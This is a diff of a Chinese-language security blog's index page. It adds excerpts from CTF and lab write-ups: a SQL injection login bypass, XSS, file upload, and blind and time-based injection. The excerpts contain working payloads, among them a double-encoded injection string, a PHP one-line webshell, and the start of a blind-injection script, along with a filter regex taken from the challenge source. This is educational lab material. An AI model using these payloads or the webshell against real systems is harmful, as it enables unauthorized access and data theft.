@@ -161,6 +161,34 @@
       <div class="w-full">
         
           <div class="post-item group border-b border-b-hacker-color3 ">
+            <a href="/2025/06/27/2025HNCTF-web%E5%A4%8D%E7%8E%B0/" class="block py-2 px-8 group-hover:bg-hacker-hover-color space-y-4">
+              <h2 class="post-title text-hacker-color1 group-hover:text-white font-bold text-2xl">
+                2025HNCTF-web复现
+              </h2>
+              <p class="post-meta text-hacker-color3 text-sm group-hover:text-white">
+                2025-06-27
+              </p>
+              <p class="post-excerpt text-hacker-color3 group-hover:text-white">
+                半成品login尝试弱密码进行登录
+admin&amp;#x2F;admin123,成功登录后台
+
+根据提示这个后台并不能得到有用的信息
+尝试进行sql注入随意输入一个账号和密码登录并进行抓包，得到一下的数据包
+
+尝试构造sql注入，发现密码的位置存在sql注入
+经过测试发现对单引号和or关键字进行了过滤
+单引号可以使用双编码绕过，%2527，or关键字可以使用||进行替换
+
+出入成功，payload为
+username&amp;#x3D;admin&amp;amp;password&amp;#x3D;1%2527||1&amp;#x3D;1#
+
+发现是存在回显的，尝试适应oder by语句查看回显的列数
+username&amp;#x3D...
+              </p>
+            </a>
+          </div>
+        
+          <div class="post-item group border-b border-b-hacker-color3 ">
             <a href="/2025/05/28/XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%85%B7%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" class="block py-2 px-8 group-hover:bg-hacker-hover-color space-y-4">
               <h2 class="post-title text-hacker-color1 group-hover:text-white font-bold text-2xl">
                 XSS漏洞的两个具体的利用方式
@@ -175,26 +203,17 @@
 靶场实践DVWA     等级low
 
 尝试输入最简单的弹窗payload
-&amp;lt;!–code￼0–&amp;gt;
-
+&amp;lt;script&amp;gt;alert(&amp;#x2F;xss&amp;#x2F;)&amp;lt;&amp;#x2F;script&amp;gt;
 
 
 弹窗成功
 查看源码
-&amp;lt;!–code￼1–&amp;gt;
+&amp;lt;?php
 
+header (&#34;X-XSS-Protection: 0&#34;);
 
-简单的get传参,参数为name，无任何过滤
-本地利用xss获得cookie值
-hacker.js
-&amp;lt;!–code￼2–&amp;gt;
-
-
-hacker.php
-&amp;lt;!–code￼3–&amp;gt;
-
-
-构造...
+// Is there any input?
+if( array_key_exist...
               </p>
             </a>
           </div>
@@ -209,8 +228,7 @@ hacker.php
               </p>
               <p class="post-excerpt text-hacker-color3 group-hover:text-white">
                 upload-1（扩展名）直接上传一句话木马
-&amp;lt;!–code￼0–&amp;gt;
-
+&amp;lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;
 
 
 可知被js拦截了
@@ -220,12 +238,9 @@ hacker.php
 返回靶场的页面，复制上传的文件的链接，打开蚁剑，输入上面复制的链接打开蚁剑，粘贴网址，输入密码
 
 核心的源码如下：
-&amp;lt;!–code￼1–&amp;gt;
-
-
-源码的作用是截取点号之后的文件名，精确匹配上面的允许上传的文件名。
-能进行绕过的原因是：
-这段源码仅仅通过js前端检查了文件名的后缀，而不检查真实的文件类型（如通过文件头Magic Number或...
+var allow_ext &amp;#x3D; &amp;quot;.jpg|.png|.gif&amp;quot;;
+    &amp;#x2F;&amp;#x2F;提取上传文件的类型
+    var ext_name &amp;#x3D; file....
               </p>
             </a>
           </div>
@@ -244,24 +259,13 @@ hacker.php
 2.获取数据库长度的函数
 3.获取数据库名称的函数
 4.主程序的入口
-&amp;lt;!–code￼0–&amp;gt;
+ import requests
 
-
-
-这只是个简单的获取数据库长度和数据库名的脚本，下面是完整的布尔盲注的脚本。
-&amp;lt;!–code￼1–&amp;gt;
-
-
-下面是脚本运行得到的数据
-&amp;lt;!–code￼2–&amp;gt;
-
-
-时间盲注脚本下面是一个比较我认为比较简洁的时间盲注的脚本，本可以根据布尔盲注的脚本简单更改的，但是这种脚本也值得学习，借鉴
-&amp;lt;!–code￼3–&amp;gt;
-
-
-下面是脚本运行的结果
-&amp;lt;!–code￼4–&amp;...
+ url=&#34;xxxxx&#34;
+ def get_length():
+    for i in range(10):
+        payloasd1=&#34;?id=1%27%20and%20(length(database()))%20=%20&amp;#123;&amp;#125;%20--      +&#34;.forma(i)  #拼接进url进行访问测试，不进行url进行解析的话可能会出现服务器无法解析的情况
+    ...
               </p>
             </a>
           </div>
@@ -276,35 +280,10 @@ hacker.php
               </p>
               <p class="post-excerpt text-hacker-color3 group-hover:text-white">
                 笛卡尔积原理：连接表是一个很耗时的操作（A×B&amp;#x3D;A和B中每个元素的组合所组成的集合，就是连接表）
-&amp;lt;!–code￼0–&amp;gt;
-
+SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
 
 靶场实践（sqli-9）
-&amp;lt;!–code￼1–&amp;gt;
-
-
-
-页面延迟回显
-
-页面直接回显，说明书库名的长度为7.
-接下来查询数据库
-&amp;lt;!–code￼2–&amp;gt;
-
-
-
-页面延迟回显
-
-页面立刻回显
-说明数据库名的第一个字符串对应的ascii码的值为115，则第一个字符串为‘s’。
-以此类推可以得到完整的数据库名为security。
-接下来查询第一个表名的长度
-&amp;lt;!–code￼3–&amp;gt;
-
-
-
-页面延迟回显
-
-页面立刻出现回显，...
+?id&amp;#x3D;1 &amp;#39; and if(length((select database()))&amp;gt;7,(select count(*) from information_schema.columns A,information_sc...
               </p>
             </a>
           </div>
@@ -321,17 +300,9 @@ hacker.php
                 简介Quine又叫做自产生程序，在sql注入技术中，这是一种是的输入的SQL
 语句与输出的SQL语句一致的技术，常用于一些特殊的登陆绕过sql注入中。
 实践
-&amp;lt;!–code￼0–&amp;gt;
-
-
-观察这个源码，存在一个看似很明显的SQL注入，黑名单中还有许多的过滤。
-例如：
-like替换’&amp;#x3D;’,benchmark()替换sleep函数，mid()函数替换substr()函数，&amp;#x2F;**&amp;#x2F;替换空格。
-下面是注入的payload
-&amp;lt;!–code￼1–&amp;gt;
-
-
-（sys.schema_table_statistics_with_buffer是Mysql数据库中的...
+function checkSql($s) &amp;#123;
+    if(preg_match(&amp;quot;&amp;#x2F;regexp|between|in|flag|&amp;#x3D;|&amp;gt;|&amp;lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;amp;|;|\\\$|0x|sleep|\ &amp;#x2F;i&amp;quot;,$s))&amp;#123;
+        alertM...
               </p>
             </a>
           </div>
